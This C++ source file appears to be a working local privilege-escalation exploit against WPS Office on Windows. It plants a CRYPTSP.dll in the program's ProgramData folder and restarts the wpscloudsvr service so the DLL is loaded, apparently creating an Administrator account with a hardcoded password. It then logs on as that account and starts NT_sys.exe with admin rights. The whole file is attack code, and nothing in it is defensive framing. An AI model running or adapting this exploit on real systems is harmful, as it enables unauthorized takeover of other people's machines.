#include <stdio.h>
#include <iostream>
#include <windows.h> 
#include <tlhelp32.h>
#include <process.h>
#include <userenv.h>
#include <tchar.h>

#pragma comment(lib, "Userenv.lib")


int wmain(int argc, WCHAR* argv[])
{
	 // Copy dll to destination 

	char Destination[] = "C:\\ProgramData\\kingsoft\\office6\\CRYPTSP.dll";
	char Src[] = "CRYPTSP.dll"; 
	CopyFileA(Src, Destination, FALSE); 

	/* restarting the service */
	system("cmd /c net stop wpscloudsvr"); /* in case its already on */
	system("cmd /c net start wpscloudsvr"); 
	Sleep(10000);
	//system("cmd /c net stop wpscloudsvr"); /* in case its already on */
	//system("cmd /c net start wpscloudsvr");
	//Sleep(10000);
	//system("cmd /c net stop wpscloudsvr"); /* in case its already on */
	//system("cmd /c net start wpscloudsvr");
	//Sleep(10000);
	puts("[+]service restartded successfully"); 
	puts("[+] waiting for service to load dll"); 
	//Sleep(10000);
	/* logging as new user */
	wchar_t cmd[] = L"NT_sys.exe";
	

	HANDLE admin_token;
	DWORD     dwSize;
	HANDLE    hToken;
	LPVOID    lpvEnv;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO         si = { 0 };
	WCHAR               szUserProfile[256] = L"";

	if (!LogonUser(L"Administrator", L"", L"p@@wned", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &admin_token))
	{
		if (!LogonUser(L"Administrateur", L"", L"p@@wned", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &admin_token)) {

			printf("error : %d", GetLastError());
			exit(1);
		}
	}

	printf("[+] escalating to admin \n");
	Sleep(500);
	/*SECURITY_IMPERSONATION_LEVEL seImpLv = SecurityImpersonation;
	TOKEN_TYPE tkentype = TokenPrimary;
	SECURITY_ATTRIBUTES sec_att = SECURITY_ATTRIBUTES();
	HANDLE newtoken;*/


	if (!CreateEnvironmentBlock(&lpvEnv, admin_token, TRUE))
	{
		printf("error : %d\n ", GetLastError());
		exit(1);
	}
	printf("[+] env block created success\n");
	Sleep(500);

	dwSize = sizeof(szUserProfile) / sizeof(WCHAR);

	if (!GetUserProfileDirectory(admin_token, szUserProfile, &dwSize))
		printf("error getting user profile : %d\n ", GetLastError());

	printf("[+] Got user profile success\n");
	Sleep(4000);

	if (!CreateProcessWithLogonW(L"Administrateur", NULL, L"p@@wned",
		LOGON_WITH_PROFILE, NULL, cmd,
		CREATE_UNICODE_ENVIRONMENT, lpvEnv, szUserProfile,
		&si, &pi))
	{
		if (!CreateProcessWithLogonW(L"Administrator", NULL, L"p@@wned",
			LOGON_WITH_PROFILE, NULL, cmd,
			CREATE_UNICODE_ENVIRONMENT, lpvEnv, szUserProfile,
			&si, &pi))
				printf("error : %d\n ", GetLastError());
	}
	WaitForSingleObject(pi.hProcess, INFINITE);
	if (!DestroyEnvironmentBlock(lpvEnv))
		printf("error : %d\n ", GetLastError());
	Sleep(4000);

	CloseHandle(admin_token);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

}
